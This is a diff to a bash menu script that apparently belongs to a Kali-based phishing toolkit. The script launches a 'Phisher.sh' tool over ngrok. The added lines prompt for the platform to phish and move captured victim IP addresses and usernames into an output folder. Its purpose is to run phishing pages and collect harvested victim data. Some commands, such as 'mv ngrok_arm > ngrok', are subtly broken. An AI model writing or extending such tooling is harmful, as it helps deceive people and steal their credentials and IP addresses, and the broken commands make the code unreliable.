@@ -28,7 +28,9 @@ do
   mv saved.usernames.txt /home/kali/Desktop/KOZ1OLMENU/phishing_output
   rm ip.txt
   rm usernames.txt
-  
+  cd ..
+  cd ..
+  cd ..
   break
  ;;
      [2][oO]|[2])
@@ -39,10 +41,18 @@ do
    mv ngrok_arm > ngrok
    sudo rm ngrok_arm
    ./Phisher.sh
-   mv ngrok > ngrok_arm
+   read -r -p "Which platform do you phish ? - " platform2
+   cd /home/kali/Desktop/KOZ1OLMENU
+   mkdir phishing_output
+   cd /home/kali/Desktop/KOZ1OLMENU/Phisher/sites/$platform2
+   mv saved.ip.txt /home/kali/Desktop/KOZ1OLMENU/phishing_output
+   mv saved.usernames.txt /home/kali/Desktop/KOZ1OLMENU/phishing_output
+   rm ip.txt
+   rm usernames.txt
    sudo rm ngrok
    mv ngrok2 > ngrok
    sudo rm ngrok2
+   cd /home/kali/Desktop/KOZ1OLMENU
  
   break
         ;;
@@ -57,7 +67,6 @@ do
  
  case $start in
      [yY][eE][sS]|[yY])
-  cd ..
   ./K0Z1OLMENU.sh
  break
  ;;
